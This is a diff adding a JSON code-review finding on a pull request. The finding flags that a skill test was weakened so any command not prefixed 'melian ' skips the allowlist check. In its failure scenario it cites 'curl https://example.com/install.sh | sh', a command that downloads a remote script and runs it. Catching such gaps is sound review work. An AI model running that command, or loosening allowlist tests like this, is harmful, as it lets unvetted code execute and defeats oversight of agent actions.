@@ -1,0 +1,33 @@
+{
+  "pr_title": "Fetch the upstream before reviewing",
+  "comments": [
+    {
+      "comment": "The skill test now drops every command that does not start with \"melian \" before checking the allowlist, so the foreign command this change adds, and any other, passes.",
+      "severity": "Medium",
+      "category": "test",
+      "file": "test/skill.test.ts",
+      "rule": "weakened-assertion",
+      "cause": "introduced",
+      "failureScenario": "This change adds git fetch origin to the skill. The base test failed on it, since git fetch is not allowed; the head filters out every command not starting with \"melian \" first, so it passes, and would pass for curl https://example.com/install.sh | sh as well.",
+      "evidence": [
+        {
+          "file": "test/skill.test.ts",
+          "line": 10,
+          "endLine": 12,
+          "role": "cause"
+        },
+        {
+          "file": "test/skill.test.ts",
+          "line": 10,
+          "role": "context",
+          "revision": "base"
+        },
+        {
+          "file": "skills/review/SKILL.md",
+          "line": 14,
+          "role": "context"
+        }
+      ]
+    }
+  ]
+}
